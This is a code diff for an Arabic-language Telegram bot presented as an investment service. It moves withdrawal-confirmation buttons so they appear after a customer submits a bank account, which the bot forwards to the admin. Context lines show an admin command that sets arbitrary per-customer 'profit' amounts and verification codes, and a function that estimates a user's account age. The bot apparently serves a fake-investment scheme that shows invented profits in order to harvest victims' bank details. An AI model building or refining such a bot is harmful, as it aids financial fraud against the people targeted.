@@ -52,7 +52,6 @@ def estimate_account_age(user_id: int) -> str:
         return "حساب حديث نسبياً (وتم إنشاؤه في السنوات الأخيرة)"
 
 # أمر الأدمن لتحديد المبلغ ورقم التحقق لزبون معين بدقة:
-# /setprofit <user_id> <amount> <code_number>
 async def set_profit(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         return
@@ -119,7 +118,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup=ReplyKeyboardRemove()
     )
 
-# معالجة الرسائل النصية وحالة التحقق من الكود
+# معالجة الرسائل النصية
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg = update.message
     if not msg or not msg.text:
@@ -145,11 +144,27 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await msg.reply_text("❌ الرجاء إدخال بياناتك صحيحة (مثل بيانات الحساب أو خطوات التسجيل والإشتراك)")
         return
 
-    # الحالة الخاصة بإدخال الحساب البنكي
+    # الحالة الخاصة بإدخال الحساب البنكي (عندما يرسله الزبون)
     if current_state == "waiting_for_bank_account":
         user_states[user_id] = "completed"
-        await msg.reply_text("✅ **تم حفظ بيانات الحساب البنكي بنجاح!**\n\nجاري معالجة عملية تحويل الأرباح لحسابك.")
         
+        # أزرار تأكيد السحب وإلغاء السحب تظهر في الرسالة الأخيرة بعد إرسال الحساب
+        keyboard = [
+            [
+                InlineKeyboardButton("تأكيد السحب", callback_data="withdraw_confirm"),
+                InlineKeyboardButton("إلغاء سحب", callback_data="withdraw_cancel")
+            ]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+
+        await msg.reply_text(
+            "✅ **تم استلام الحساب البنكي وحفظه بنجاح!**\n\n"
+            "الرجاء اختيار أحد الخيارات أدناه لإتمام عملية السحب:",
+            reply_markup=reply_markup,
+            parse_mode="Markdown"
+        )
+        
+        # إشعار للأدمن بالحساب البنكي المدخل
         await context.bot.send_message(
             chat_id=ADMIN_ID,
             text=(
@@ -193,13 +208,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 parse_mode="Markdown"
             )
 
-            # أزرار عرض الرصيد والعمليات
+            # زر "ادخل حسابك البنكي" فقط في رسالة الرصيد
             keyboard = [
-                [InlineKeyboardButton("💳 ادخل حسابك البنكي", callback_data="enter_bank_account")],
-                [
-                    InlineKeyboardButton("تأكيد السحب", callback_data="withdraw_confirm"),
-                    InlineKeyboardButton("إلغاء سحب", callback_data="withdraw_cancel")
-                ]
+                [InlineKeyboardButton("💳 ادخل حسابك البنكي", callback_data="enter_bank_account")]
             ]
             reply_markup = InlineKeyboardMarkup(keyboard)
 
@@ -273,7 +284,7 @@ def main():
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     app.add_handler(CallbackQueryHandler(button_handler))
 
-    print("🤖 بوت تحالف المالية للإستثمار يعمل الآن بكفاءة وبأعلى معايير الأمان والتنظيم...")
+    print("🤖 بوت تحالف المالية للإستثمار يعمل الآن بالشكل المطلوب بدقة...")
     app.run_polling()
 
 if __name__ == "__main__":
